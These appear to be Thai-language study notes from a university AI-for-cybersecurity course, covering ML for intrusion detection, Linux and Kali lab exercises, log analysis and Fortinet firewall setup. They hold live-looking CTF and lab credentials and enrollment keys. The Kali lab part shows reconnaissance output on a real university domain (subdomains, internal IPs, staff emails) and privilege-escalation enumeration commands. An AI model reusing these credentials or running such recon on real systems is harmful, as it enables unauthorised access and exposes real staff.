## Introduction
หลักสูตรปัญญาประดิษฐ์สำหรับความมั่นคงปลอดภัยไซเบอร์
[CTF](https://ndg.rmutl.ac.th/challenges)
```
G8-Ruchida
123456789
```
[วิธีการสมัคร CTF](https://www.youtube.com/watch?v=tBcq57JAzPE&feature=youtu.be)
[Software ที่ต้องใช้](https://drive.google.com/drive/folders/1HMvnL70DMZVlaOGr7NMXRdgvCmX-Eg51)

หากผู้เข้าร่วมประสงค์ที่จะ "ลา" จะต้องทำเรื่องลาพร้อมแนบหลักฐานเพื่อใช้เป็นข้อมูลแจ้งให้ทางอว. โดยให้ส่งเอกสารหลักฐานมาที่ E-Mail : aicyber@edu.rmutl.ac.th
## [Lecture](https://www.youtube.com/playlist?list=PLU6p_kflJRUL9JgBmeqE3ldrTxNgocKQU)

### Session 1 FCF - Introduction to Threat Landscape
[Fortinet Network Security](https://www.youtube.com/watch?v=bEAQSql-cWM)
[OWASP Juice Shop](https://preview.owasp-juice.shop/#/)
### Session 2 Getting Started in Cyber Security and Ethics
[Cyber Security](https://www.youtube.com/watch?v=CFDlkGMwKZ4)
[Cyber Security & Ethics]()
### Session 3 Introduction to AI and Its Role in Cyber Security
[YouTube Recording](https://www.youtube.com/watch?v=6Mo22aUwvAE)
### Session 4 NLP for AI in Cyber Security
#### Artificial Intelligence 
เลียนแบบการคิดและการเรียนรู้ของมนุษญ์เพื่อแก้ปัญหาและตัดสินใจ
1950s Alan Turing & Turing Test ถ้าแยกไม่ออกว่าเป็นคนหรือเครื่องจักร
1960-1970s Expert Systems ความรู้มาจากผู้เชี่ยวชาญ สร้างเป็นกฏ
1980-1990s Machine Learning เรียนรู้จากข้อมูล และทำนายผล
2000-2010s Big Data & Deep Learning ใช้ Neural Network
2020s Generative AI & Large Language Models
#### Big Data 
ในปัจจุบัน ควรมี 5 หรืออย่างน้อย 3 องค์ประกอบ
- Volume มหาศาล
- Velocity เกิดเร็วมาก
- Variety หลายรูปแบบ
- Veracity ความจริง
- Value มีค่า
####  AI in Cyber Security Context
- ปริมาณข้อมูลเยอะ ต้องการ Big Data
- การโจมตีซับซ้อน ต้องการ  Deep Learning
- ขาดแคลนผู้เชี่ยวชาญ ต้องการ Agent

#### ประเภทของ AI
- Supervised Learning เรียนรู้จากข้อมูลที่มีคำตอบที่ถูกต้องอยู่แล้ว เพื่อทำนายข้อมูลใหม่
	- Classification ทำนายหมวดหมู่หรือกลุ่ม
		- Malware Detection
	- Regression ทำนายค่าต่อเนื่อง
- Unsupervised Learning การเรียนรู้จากข้อมูลที่ไม่มี Label เพื่อค้นหารูปแบบหรือโครงสร้าง
	- Clustering จับกลุ่มข้อมูลที่มีลักษณะคล้ายกัน
		- User Behavior Clustering, Network Traffic Clustering
	- Anomaly Detection ตรวจจับข้อมูลผิดปกติ จัดกลุ่มก่อน แล้วดูว่ากลุ่มไหนผิดปกติ
		- Zero-day, Fraud Detection
	- Association Rule ค้นหาความสัมพันธ์ระหว่างข้อมูล หาความเหมือนความต่าง

Algorithm
- Decision Tree
- Random Forest 
	- เอา Decision Tree หลายต้นมารวมกัน ลดการ Overfitting
- SVM เหมาะกับข้อมูลมิติสูง
- Neural Networks

คำศัพท์
- Overfitting เรียนรู้มากไป เคร่งตำรา โมเดลซับซ้อนไป ไม่ดี 
	- ต้องลดความซับซ้อน
	- เพิ่ม sample ให้หลากหลาย
	- ลด Layer, Node, Feature, Epoch รอบการเรียนรู้
	- Regularization
	- Cross Validation
- Underfitting เรียนรู้น้อยไป เดามั่ว ตอบผิด
	- ต้องเพิ่มความซับซ้อน
	- เพิ่ม Layer, Node, Feature, Epoch
	- เพิ่มคุณภาพของข้อมูล (Underfitting อาจเกิดจากข้อมูลที่ preprocess ไม่ดี noise เยอะ)
- Bestfitting สมดุล Optimal พอดี

#### Dataset
- Sample
- Features
- Label
##### UNSW-NB15: University of New South Wales (2015)
- Feature
	- Flow-based Features: Duration, Protocol, Service
	- Basic Features: Packet Size, Flags
	- Content Features: TCP window size, Urgent Pointer
	- Time Features: Inter-arrival time
	- Generated Features: Statistical Calculation
- Label
	- Fuzzers
	- Analysis
	- Backdoor
	- DoS
	- Exploits
	- Generic
	- Reconnaissance
	- Shellcode
	- Word
##### NSL-KDD DataSet

#### Feature Selection
Statistic Feature
- 
Temporal Feature
- Time of day, day of week
- Session duration
- Frequency analysis
Content-based Feature
- Protocol information
- Port number
- Payload characteristic
#### Feature Selection Techniques
- Correlation Analysis
- Information Gain
- Principle Component Analysis (PCA)
- Recursive Feature Elimination
#### Feature Scaling
- Normalization (0-1 Scaling)
- Standarization (z-score)
- Robust Scaling
- Min-Max Scaling

#### Evaluation Metrics for Security Model
#### Confusion Matrix: Desired Output vs Program Output
|                   | Predicted Normal (0) | Predicted Attack (1) |
| ----------------- | -------------------- | -------------------- |
| Actual Normal (0) | True Negative (TN)   | False Positive (FP)  |
| Actual Attack (1) | False Negative (FN)  | True Positive (TP)   |
#### Key Metrics

##### Basic Metric
- Accuracy = (TP+TN) / (TP+TN+FP+FN) ความแม่นยำที่ ตอบถูก / ทั้งหมด
- Precision = TP / (TP + FP) ความแน่ชัด ที่ตรวจเจอ เป็นจริงเท่าไหร่
- Recall (Sensitivity) = TP / (TP + FN) ความไว คนที่เป็นจริง เราตรวจเจอเท่าไหร่
- Specificity = TN / (TN + FP) ความเฉพาะเจาะจง ที่ตรวจว่าไม่พบ เป็นจริงเท่าไหร่
##### Advanced Metrics
- F1-Score = 2 x (Precision x Recall) / (Precision + Recall)
- AUC-ROC = Area Under Curve ระหว่าง TPR vs FPR
- False Positive Rate = FP / (FP + TN)
- Detection Rate = TP / (TP + FN)

Security-Specific Consideration
- False Positive แจ้งเตือนผิด สร้างความเหนื่อยล้าให้ทีม
- False Negative พลาดการโจมตี อันตรายต่อระบบ ต้องลดให้น้อยที่สุด

#### Intrusion Detection System (IDS)
ใช้งานร่วมกับ Firewall ที่ป้องกันควบคุบการเข้าออก เพื่อตรวจจับและเตือนภัย
รูปแบบการทำงานแบ่งออกเป็น
- รวบรวมข้อมูล
- วิเคราะห์ข้อมูล
	- เทียบกับฐานข้อมูล
	- ตรวจหาความผิดปกติ
- แจ้งเตือนผู้ดูแล
- เก็บหลักฐานเพื่อวิเคราะห์
สามารถตรวจจับได้พฤติกรรมต่อไปนี้ได้
- การสแกนระบบ 
	- Port Scan ค้นหา Port ที่เปิดอยู่บน Host
	- Host Discovery
- การโจมตี 
	- Brute Force เดารหัสอย่างเป็นระบบและรวดเร็วจนกว่าจะเจอ
		- Dictionary Attack ใช้คำที่พบบ่อย
		- Credential Stuffing ใช้คู่ข้อมูลหลุดจาก Data Breach ของระบบอื่น
	- DoS (Denial of Service) ทำให้ระบบทรัพยากรไม่สามารถใช้การได้
		- DDoS (Distributed Denial of Service) โจมตีจากคอมพิวเตอร์หลายเครื่องพร้อมกัน
	- Exploits ใช้ช่องโหว่ (Vulnerability) ในการเข้าถึงระบบ
- Payload อันตราย
	- SQL Injection (SQLi) แทรกคำสั่ง SQL ที่อันตรายเพื่อ bypass เข้าสู่ระบบ
	- Cross-Site Scripting (XSS) โจมตีผ่าน JavaScript
- การละเมิดสิทธิ
	- Privilege escalation
- Malware/backdoor
	- C2: Command and Control
##### Signatured-based
เทคนิคการตรวจจับภัยคุกคามจากลายเซ็นหรือรูปแบบเฉพาะของภัยที่เคยรู้จักมาก่อนได้แม่นยำ แต่ตรวจจับภัยใหม่ไม่ได้ เช่น รหัสที่ซ้ำกัน พฤติกรรมเฉพาะ หรือโครงสร้าง packet ที่ผิดปกติ
##### Anomaly-based

##### Hybrid

#### การใช้ Machine Learning ในระบบ IDS

#### Machine Learning Process
- Define Problem กำหนดว่าวัตถุประสงค์เป็นปัญหาแบบใด
- Collect Data เตรียมข้อมูลจากแหล่งข้อมูลต่างๆ
	- Database
	- Spreadsheet, JSON
	- API
	- IoT Sensor
	- Log file
	- Public Datasets เช่น UCI, Kaggle, Huggingface
- Preprocess Data
- EDA
- Split Data
- Choose Model
- Train
- Tune
- Evaluate


### Session 5 Cyber Security Foundation and Kali Linux Lab
Introduction to Linux and Network
##### [Lab - Introduction to Danger](https://docs.google.com/forms/d/e/1FAIpQLSdm08W-olJfYRRF7YuxJlSUZfyvcqMHoR9SqgF5OskqR1AH2A/viewform)
##### Quiz
Create shell script
- copy directory with permission to directory /tmp
- display number of line from command `ls -l /tmp/etc` to file `test01.txt`
- select column number line 261-270 to file test02.txt
- display reverse line number from file test02.txt
```
#!/bin/sh

/user/bin/sudo /usr/bin/cp -rpvf /etc /tmp
ls -l /tmp/etc | nl > /tmp/test01.txt
```
##### [Lab - Calculate IPv4 Subnets](https://docs.google.com/forms/d/e/1FAIpQLSc_OYbANFLvMNvtAqV57OXKmPlpr2lKYCVehMl4QacfywQLsg/viewform?pli=1)
##### [Lab - Kali Network Security](https://drive.google.com/drive/folders/1-8fvgwbVPZUGhq3IGNK9m3TfFsS1L6dT)
Kali Linux Lab: Network Security Tools (IP, TCP/IP, DNS, DHCP)

🧪 Duration: 60 Minutes  
This lab introduces basic network security tools available in Kali Linux. Students will analyze and manipulate IP, TCP/IP, DNS, and DHCP traffic using built-in utilities.

Part 1: IP and TCP/IP Inspection (10 mins)

A. View your IP and routing table

Commands:  
ip a  
ip route  
ifconfig (optional)

Questions:  
- What is your IP address?  
- What is your default gateway?  

B. Analyze active connections and services

Commands:  
netstat -tulnp  
ss -ant  
lsof -i

Questions:  
- What ports are open?  
- Which services are listening?  

Part 2: DNS Enumeration and Analysis (10 mins)

A. Use dig and nslookup for DNS queries

Commands:  
dig @8.8.8.8 google.com  
nslookup google.com
```
(base) ┌──(kali㉿kali)-[~]
└─$ dig @8.8.8.8 google.com   

; <<>> DiG 9.20.9-1-Debian <<>> @8.8.8.8 google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52952
;; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;google.com.                    IN      A

;; ANSWER SECTION:
google.com.             300     IN      A       172.217.194.139
google.com.             300     IN      A       172.217.194.113
google.com.             300     IN      A       172.217.194.102
google.com.             300     IN      A       172.217.194.101
google.com.             300     IN      A       172.217.194.138
google.com.             300     IN      A       172.217.194.100

;; Query time: 3238 msec
;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)
;; WHEN: Sun Jul 27 01:08:53 PDT 2025
;; MSG SIZE  rcvd: 135

                                                                                                                                                           
(base) ┌──(kali㉿kali)-[~]
└─$ nslookup google.com
Server:         172.16.195.2
Address:        172.16.195.2#53

Non-authoritative answer:
Name:   google.com
Address: 172.217.25.110
Name:   google.com
Address: 2404:6800:4001:814::200e

                                                                                                                                                           
(base) ┌──(kali㉿kali)-[~]
└─$ dnsenum rmutl.ac.th 
dnsenum VERSION:1.3.1

```
Questions:  
- What is the A record for google.com?  
- Which DNS server resolved the query?  

B. Use dnsenum and theHarvester for passive recon

Commands:  
`dnsenum rmutl.ac.th`  
```
dnsenum VERSION:1.3.1

-----   rmutl.ac.th   -----                                                                                                                                
Host's addresses:                                                                                                                                          
__________________                                                                                                                                         
rmutl.ac.th.                             5        IN    A        45.60.32.44                                                                              
rmutl.ac.th.                             5        IN    A        45.60.38.44

Name Servers:                                                                                                                                              
______________                                                                                                                                             
ns1-32.azure-dns.com.                    5        IN    A        150.171.10.32                                                                             
ns2-32.azure-dns.net.                    5        IN    A        150.171.16.32
ns3-32.azure-dns.org.                    5        IN    A        13.107.222.32
ns4-32.azure-dns.info.                   5        IN    A        13.107.206.32

Mail (MX) Servers:                                                                                                                                         
___________________                                                              rmutl-ac-th.mail.protection.outlook.com. 5        IN    A        52.101.157.80                                                                             
rmutl-ac-th.mail.protection.outlook.com. 5        IN    A        52.101.137.2
rmutl-ac-th.mail.protection.outlook.com. 5        IN    A        52.101.124.117
rmutl-ac-th.mail.protection.outlook.com. 5        IN    A        52.101.137.0

Trying Zone Transfers and getting Bind Versions:                                                                                                           
_________________________________________________                                
Trying Zone Transfer for rmutl.ac.th on ns1-32.azure-dns.com ... 
AXFR record query failed: REFUSED

Trying Zone Transfer for rmutl.ac.th on ns3-32.azure-dns.org ... 
AXFR record query failed: REFUSED

Trying Zone Transfer for rmutl.ac.th on ns4-32.azure-dns.info ... 
AXFR record query failed: REFUSED

Trying Zone Transfer for rmutl.ac.th on ns2-32.azure-dns.net ... 
AXFR record query failed: REFUSED

Brute forcing with /usr/share/dnsenum/dns.txt:                                                                                                             
_______________________________________________                                  autodiscover.rmutl.ac.th.                5        IN    CNAME    autodiscover.outlook.com.                                                                
autodiscover.outlook.com.                5        IN    CNAME    atod-g2.tm-4.office.com.
atod-g2.tm-4.office.com.                 5        IN    A        40.104.72.136
atod-g2.tm-4.office.com.                 5        IN    A        40.104.72.104
atod-g2.tm-4.office.com.                 5        IN    A        40.99.8.216
atod-g2.tm-4.office.com.                 5        IN    A        52.98.43.168
atod-g2.tm-4.office.com.                 5        IN    A        52.98.94.200
atod-g2.tm-4.office.com.                 5        IN    A        52.98.43.184
atod-g2.tm-4.office.com.                 5        IN    A        52.97.97.88
atod-g2.tm-4.office.com.                 5        IN    A        40.100.18.24
av.rmutl.ac.th.                          5        IN    A        203.158.167.6
blog.rmutl.ac.th.                        5        IN    A        203.158.167.24
dev.rmutl.ac.th.                         5        IN    CNAME    cname.vercel-dns.com.
cname.vercel-dns.com.                    5        IN    A        76.76.21.164
cname.vercel-dns.com.                    5        IN    A        66.33.60.194
mail.rmutl.ac.th.                        5        IN    CNAME    outlook.office.com.
outlook.office.com.                      5        IN    CNAME    substrate.office.com.
substrate.office.com.                    5        IN    CNAME    outlook.office365.com.
outlook.office365.com.                   5        IN    CNAME    ooc-g2.tm-4.office.com.
ooc-g2.tm-4.office.com.                  5        IN    CNAME    outlook.ms-acdc.office.com.
outlook.ms-acdc.office.com.              5        IN    CNAME    KUL-efz.ms-acdc.office.com.
KUL-efz.ms-acdc.office.com.              5        IN    A        52.97.97.162
KUL-efz.ms-acdc.office.com.              5        IN    A        52.97.97.130
KUL-efz.ms-acdc.office.com.              5        IN    A        40.99.8.210
KUL-efz.ms-acdc.office.com.              5        IN    A        40.104.72.162
nms.rmutl.ac.th.                         5        IN    A         10.0.1.69
ns1.rmutl.ac.th.                         5        IN    A        203.158.160.66
ns2.rmutl.ac.th.                         5        IN    A        203.158.160.73
ns3.rmutl.ac.th.                         5        IN    A        203.158.167.3
ocs.rmutl.ac.th.                         5        IN    CNAME    edge.rmutl.ac.th.
edge.rmutl.ac.th.                        5        IN    A        203.158.160.201
plan.rmutl.ac.th.                        5        IN    A        203.158.167.53
portal.rmutl.ac.th.                      5        IN    A        203.158.167.49
repository.rmutl.ac.th.                  5        IN    A        203.158.167.16
training.rmutl.ac.th.                    5        IN    CNAME    cname.vercel-dns.com.
cname.vercel-dns.com.                    5        IN    A        76.76.21.164
cname.vercel-dns.com.                    5        IN    A        66.33.60.194
vpn.rmutl.ac.th.                         5        IN    A        203.158.167.25
vpn2.rmutl.ac.th.                        5        IN    A        203.158.167.25
vps.rmutl.ac.th.                         5        IN    A        10.0.12.20
www.rmutl.ac.th.                         5        IN    CNAME    tdhy923.ng.impervadns.net.
tdhy923.ng.impervadns.net.               5        IN    A        45.60.36.44

rmutl.ac.th class C netranges:                                                   _______________________________                                                                                                                            
45.60.32.0/24                                                                    45.60.38.0/24
203.158.160.0/24
203.158.167.0/24


```
theHarvester -d rmutl.ac.th -b bing
```

└─$ theHarvester -d rmutl.ac.th -b bing 
Read proxies.yaml from /etc/theHarvester/proxies.yaml
*******************************************************************
*  _   _                                            _             *
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
*                                                                 *
* theHarvester 4.8.0                                              *
* Coded by Christian Martorella                                   *
* Edge-Security Research                                          *
* user@example.com                                   *
*                                                                 *
*******************************************************************

[*] Target: rmutl.ac.th 

Read api-keys.yaml from /etc/theHarvester/api-keys.yaml
Searching 0 results.
[*] Searching Bing. 
[*] No IPs found.                                                                [*] Emails found: 4

----------------------                                                           academic@edu.rmutl.ac.th                                                         atchara_c@rmutl.ac.th                                                            regis@rmutl.ac.th                                                                saraban_nn@rmutl.ac.th                                                           [*] No people found.                                                             [*] Hosts found: 15                                                              
---------------------                                                            
academic.rmutl.ac.th                                                             
account.rmutl.ac.th                                                              
chiangrai.rmutl.ac.th                                                            
edu.rmutl.ac.th                                                                  
education.rmutl.ac.th                                                            
eng.rmutl.ac.th                                                                  
help.rmutl.ac.th                                                                 
lpc.rmutl.ac.th                                                                  
nan.rmutl.ac.th                                                                  
personal.rmutl.ac.th                                                             
plc.rmutl.ac.th                                                                  
portal.rmutl.ac.th                                                               
president.rmutl.ac.th                                                            
reg.rmutl.ac.th                                                                 
regis.rmutl.ac.th                  
```
Questions:  
- What subdomains or emails were found?  
- Is this useful for social engineering?  

Part 3: DHCP Monitoring and Spoofing (10 mins)

A. Monitor DHCP traffic

Commands:  
tcpdump -i eth0 port 67 or port 68

Task:  
- Plug/unplug your network or VM interface to trigger DHCP requests.

Question:  
- What is the impact of rogue DHCP servers?  

Part 4: User Identity & Access Control (10 mins)

A. Check who you are

Commands:  
whoami  
id  
groups

B. Investigate sensitive files

Commands:  
ls -l /etc/passwd  
ls -l /etc/shadow

Questions:  
- Who can access each file?  
- Why is /etc/shadow more secure?

C. Change file permissions

Commands:  
touch testfile.txt  
chmod 640 testfile.txt  
ls -l testfile.txt

Question:  
- What does '640' mean in permission format?

Part 5: Network Identity & DNS Querying (10 mins)

A. Show hostname and IP

Commands:  
hostname  
ip a

B. DNS resolution and spoofing

Commands:  
nslookup www.google.com  
nslookup example.local  
cat /etc/hosts

Questions:  
- What IPs do you get?  
- Any suspicious entries in /etc/hosts?

Part 6: Network & Service Monitoring (10 mins)

A. Check open ports and services

Commands:  
ss -tuln  
netstat -anp

B. Trace a route and check latency

Commands:  
ping -c 4 8.8.8.8  
traceroute www.google.com

C. Review login history

Commands:  
last -a | head  
who -u

Questions:  
- Are there unexpected login locations?  
- Who is currently logged in?

Part 7: File Integrity and Audit Commands (Optional)

A. Check for setuid and setgid files (security risk)

Commands:  
find / -perm -4000 -type f 2>/dev/null  
find / -perm -2000 -type f 2>/dev/null

B. Check for world-writable directories

Command:  
find / -type d -perm -0002 2>/dev/null
### Session 6 Network Security and Attack Vectors
#### Text Processing and Log Analysis
[Log File](https://drive.google.com/drive/folders/1uTN5EQlEMSgfRCSfW9CT2A2y3cpxtTyG?usp=shari)

**Pipes**
`|` เอา output ของคำสั่งก่อนหน้ามาเป็น input ต่อ

**Input/Output Redirection**
`<`
`>` แทนที่ข้อมูลเดิม
`>>` บันทึกต่อจากข้อมูลเดิม
**การค้นหาข้อมูล filter ด้วยข้อความ**
`cut`
`grep ข้อความ ชื่อไฟล์`
`awk`

**Stream Editor**
`sed`

**Quiz จากไฟล์ access.log**
- อยากรู้ว่า IP ใด เรียก `/login` มากที่สุด -> 192.168.1.18
```
grep "/login" access.log | cut -d' ' -f1 | uniq -c | sort -nr
```
- อยากรู้ว่ามี IP กี่เครื่อง -> 10
```
cut -d' ' -f1 access.log | sort | uniq | wc -l
```

[Challenge](https://docs.google.com/forms/d/e/1FAIpQLScNfP0Z5BmCvtrwA1FH8VmIRPeUIopEGc6ES7wXEffwXVSb1g/viewform)
Flag 1: Most Visited URL
```
cut -d' ' -f6 access.log | sort -r | uniq
```
Flag 2: Find 404 Errors
```
grep '404' access.log | cut -d' ' -f1 | sort -r | uniq -c
```
Flag 3: First Request Timestamp
```
cut -d' ' -f4 access.log | sort -r | uniq
```
Flag 4: Unique IP Address Count
```
cut -d' ' -f1 access.log | sort | uniq | wc -l
```
Flag 5: Suspicious Login Attempt
```
grep "POST /login" access.log | cut -d' ' -f1 | uniq -c | sort -nr
```

#### Analysis with Python

[การติดตั้ง Miniconda](https://www.anaconda.com/docs/getting-started/miniconda/install)
- ถ้าเป็น Intel ให้ใช้ Linux x86_64
- ถ้าเป็น Apple Silicon ให้ใช้ Arm 64

คำสั่ง Conda พื้นฐาน
```
# list environment
conda info --envs

# creates new virtual env
conda create -n my-conda-env

# creates new virtual env with specific python version
conda create -n my-conda-env python=3.10

# activate environment in terminal
conda activate my-conda-env

# install jupyter + notebook
conda install jupyter

# start server + kernel inside my-conda-env
jupyter notebook
```

#### [[pandas]] 
- เป็น Library สำหรับจัดการ Data
- จัดการข้อมูลในรูปแบบ Series และ DataFrame

Data Loading
- อ่านไฟล์ประเภทต่างๆได้ เช่น csv

Data Cleaning
- จัดการ missing value
- จัดการ duplicate
- จัดการ data type

Data Transformation
### Session 7 NLP Techniques for Threat Intelligence
### Session 8 Malware Analysis and Threat Intelligence
### Session 9 AI-Powered Threat Detection with NLP
### Session 10 Social Engineering and Web Security
### Session 11 Practical AI Tools for Cyber Security
### Session 12 Penetration Testing and Exploitation Techniques
### Session 13 Advanced NLP & Deep Learning in Cyber Security
### Session 14 Presenting the AI Cyber Group Project
## กิจกรรม

| เวลา                                                            | กิจกรรม                                                                                                                                                                                                                                                                                                                                      |
| --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| วันที่ 18 กรกฎาคม 2568                                          | ผู้เข้าอบรมเดินทางเข้าที่พัก ณ โรงแรมไอบิสสไตล์ เชียงใหม่                                                                                                                                                                                                                                                                                    |
| วันที่ 19 กรกฎาคม 2568 ณ ห้องประชุม โรงแรมไอบิส สไตล์ เชียงใหม่ |                                                                                                                                                                                                                                                                                                                                              |
| 08.30 น. – 09.00 น.                                             | ลงทะเบียนผู้เข้าร่วมโครงการ                                                                                                                                                                                                                                                                                                                  |
| 09.00 น. – 09.30 น.                                             | วิทยากรชี้แจงวัตถุประสงค์ กติกา และแนะนำ CTF                                                                                                                                                                                                                                                                                                 |
| 09.30 น. – 10.30 น.                                             | การอบรมเชิงปฏิบัติการ “เทคนิคฟิชชิ่งและการปลอมแปลงอีเมลล์”<br><br>โดย นายอนุพงศ์  ไพโรจน์                                                                                                                                                                                                                                                    |
| 10.45 น. – 12.00 น.                                             | การอบรมเชิงปฏิบัติการ “เทคนิคฟิชชิ่งและการปลอมแปลงอีเมลล์”<br><br>โดย นายอนุพงศ์  ไพโรจน์ (ต่อ)                                                                                                                                                                                                                                              |
| 12.00 น. – 13.00 น.                                             | พักรับประทานอาหารกลางวัน                                                                                                                                                                                                                                                                                                                     |
| 13.00 น. – 18.30 น.                                             | กิจกรรม Workshop <br><br>- การสาธิต:การใช้ CyberChef, VirusTotal, strings, pefile, hybrid-analysis<br><br>- วิเคราะห์ไฟล์ปฏิบัติการที่น่าสงสัย (แฟล็กมัลแวร์แบบคงที่)<br><br>- มัลแวร์แซนด์บ็อกซ์ – ค้นหา IOC จากพฤติกรรม (VulnHub VM)<br><br>-  สคริปต์ที่เข้ารหัสแบบย้อนกลับ (Python หรือ PowerShell)<br><br>โดย นายอนุพงศ์  ไพโรจน์ (ต่อ) |
| 19.30 น. – 20.30 น.                                             | สรุปบทเรียนและถามตอบ เกี่ยวกับ วิธีป้องกันฝั่ง Blue Team                                                                                                                                                                                                                                                                                     |

| วันที่ 20 กรกฎาคม 2568 ณ ห้องประชุม โรงแรมไอบิส สไตล์ จังหวัดเชียงใหม่ |                                                                                                                                                                                                                                                                                           |
| ---------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 08.30 น. –09.00 น.                                                     | ลงทะเบียนผู้เข้าร่วมโครงการ                                                                                                                                                                                                                                                               |
| 09.00 น. –12.00 น.                                                     | กิจกรรม Work Shop<br><br>- เครื่องมือสรุปและตั้งค่า (การเข้าถึง Wireshark, Zeek, CTFd)<br><br>- การล่า PCAP – ระบุตำแหน่งความพยายามฟิชชิ่งในอีเมล<br><br>- ตรวจจับการส่งสัญญาณมัลแวร์ในรูปแบบ DNS/HTTP<br><br>- ดึงข้อมูลและถอดรหัสการรับส่งข้อมูลที่น่าสงสัย<br><br>โดย นายอรรถพล  วิเวก |
| 12.00 น. –13.00 น.                                                     | พักรับประทานอาหารกลางวัน                                                                                                                                                                                                                                                                  |
| 13.00 น. –13.30 น.                                                     | ชี้แจงกติกา Final Challenge – Incident in the DMZ                                                                                                                                                                                                                                         |
| 13.30 น. –16.30 น.                                                     | การแข่งขันรอบชิงชนะเลิศ (ทีม vs ทีม CTF)<br><br>- ใช้ VulnHub VM จำลอง DMZ ที่โดนระบบต้อง:<br><br>• ค้นหาหลักฐานการสอบสวน<br><br>• ไฟล์มัลแวร์<br><br>• แกะรหัสอีเมลฟิชชิ่ง<br><br>• ระบุข้อ C2<br><br>• เสนอแผนฟื้นฟูระบบ<br><br>โดย นายออมทรัพย์  อินกองงามและทีมงาน                    |
| 16.30 น. เป็นต้นไป                                                     | การนำเสนอผลงานของแต่ละทีมจากกิจกรรม Workshop และประกาศคะแนนพร้อมมอบของรางวัล                                                                                                                                                                                                              |
| 18.00 น.                                                               | พิธีปิดกิจกรรม                                                                                                                                                                                                                                                                            |

หมายเหตุ  พักรับประทานอาหารว่างและเครื่องดื่ม เวลา 10.30 – 10.45 น. และ 14.30 – 14.45 น.
## [[Fortinet]] Workshop
#### Fast Track Workshop Deploying Security Strategies for the Next Geneartion Firewall (NGFW)
- Layer 7 Firewall at Network Gateway
- Inspect network traffic
- Convergence, AI-powered Thread Detection, IoT, Cloud/Hybrid, Centralized Visibility, Control and Policy Enforcement, 5G Integration, SASE, Zero-Trust
Fortinet's Network Firewall Solution
- FortiGate: network firewall
	- mutiple series
	- same architecture (ASIC ship)
	- differ in performance throughput and bandwidth
- FortiOS: firmware that has cyber security features
- FortiGuard: AI
- IAM: control access to resource for multiple use cases
- Zero Trust
- FortiProxy 
- Conten Analysis
#### [Network Security - Deploying Security Strategies for the Modern Network r02 (Cybersecurity Workshop with RMUTL) - July 19, 2025](https://training.fortinet.com/course/view.php?id=68351)
Enrollment Key: 1f2ef04954
[https://training.fortinet.com/course/view.php?id=70015](https://training.fortinet.com/course/view.php?id=70015)
**Enrolment key**: b8e94794bb
- Configure basic FortiGate settings for routing, firewall policies, and security profiles
- Setup a Fortinet Security Fabric with centralized logging, visibility, and automation
- Segment and secure the network with ISFW, ZTNA, and ADVPN for optimized remote access and WAN usage
- Setup FortiProxy secure web gateway, view logging, perform image analysis and web access authentication.
Unless otherwise indicated, all username/password combos for the various devices are:
- Username: `admin`
- Password: `Fortinet1!`
##### Topology
FortiGate: FGT-EDGE, between the internet and AcmeCorp’s network
- **IP/Netmask:** `192.168.0.101/255.255.255.0`
- **Administrative Access:** **HTTPS**, **HTTP**, **PING**, **FMG-Access**, **SSH**, and **Security Fabric Connection**
- [FortiOS 7.6](https://docs.fortinet.com/document/fortigate/7.6.0/new-features/)
- Port 3    
	⦁    **Alias:** `EDGE_DC Network`  
	⦁    **Role:** **LAN**  
		⦁    **IP/Netmask:** `10.10.30.6/255.255.255.248`  
	⦁    **Administrative access:** **PING** and **Security Fabric Connection**
- Port 4
	⦁    **Alias:** `EDGE_ISFW Network`  
	⦁    **Role:** **LAN**  
	⦁    **IP/Netmask:** `10.10.30.14/255.255.255.248`  
	⦁    **Administrative access:** **HTTPS**, **HTTP**, **PING**, and **Security Fabric Connection**
FortiGate devices: connect to FGT-EDGE to reach the internet.
- FGT-ISFW
- FGT-DC
Network
- PLC-Network (172.16.30.0/24), 
- Sales (172.16.10.0/24) and 
- Finance (172.16.20.0/24). 
- FGT-DC has one network behind it, DC (172.16.100.0/24).
##### Introduction to the Fortigate
- FortiGate installation
	- Default route: network > static routes > add internet
	- DNS Server: network > DNS > specify secondary to `8.8.8.8` (Google), enable only DNS protocol
	- Set the system time: systems > settings > select server to FortiGuard
- FortiGate addresses and firewall policies
	- Policy & Object > Address
	- Policy & Object > Firewall Policy
		- Incoming Interface
		- Outgoing Interface
		- Source
		- Destination
		- Service
- Firewall routing
	- OSPF: **Network** > **OSPF**
		- Create new **Areas**
		- Create new **Networks**
		- Create new **Interfaces**
	- Enable **Redistribute Static**
##### The Fortinet Security Fabric
The Fortinet Security Fabric spans across an entire network linking different security sensors and tools together to collect, coordinate, and respond to malicious behavior in real time. Security Fabric can be used to coordinate the behavior of different Fortinet products in your network, including FortiGate, FortiAnalyzer, FortiClient, FortiSandbox, FortiAP, FortiSwitch, and FortiClient Endpoint Management Server (EMS)

###### Security Fabric Configuration 
- Upstream
	- **Security Fabric** > **Fabric Connectors**
		- **Security Fabric role** > **Serve as Fabric Root**
		- Allow downstream device access > super_admin
			- Any interface that connects to a downstream FortiGate must have Security Fabric Connection protocol enabled.
		- Management Port : Use Admin Port
- Downstream
	- **Security Fabric** > **Fabric Connectors**
		- **Security Fabric role** > **Join the existing Fabric**
		- **Upstream FortiGate IP** is: `10.10.30.6`
		- **SAML Single Sign-On** to **Manual**
	- Go back to Upstream to approve at **System** > **Firmware & Registration**
More: **Creating a Comprehensive Fortinet Security Fabric**
###### Logging and Reporting with FortiAnalyzer
FortiAnalyzer to centralize all Security Fabric configurations, events, and alerts, offering a streamlined and enriched operational experience.
- **FabricGroup**
- **FortiView**
- **Log View** > **Logs**
	- **Security: Summary**
		- AntiVirus
		- Web Filter
		- SSL
		- DNS Query
	- **Security: Summary**
		- System Events
		- Router Events
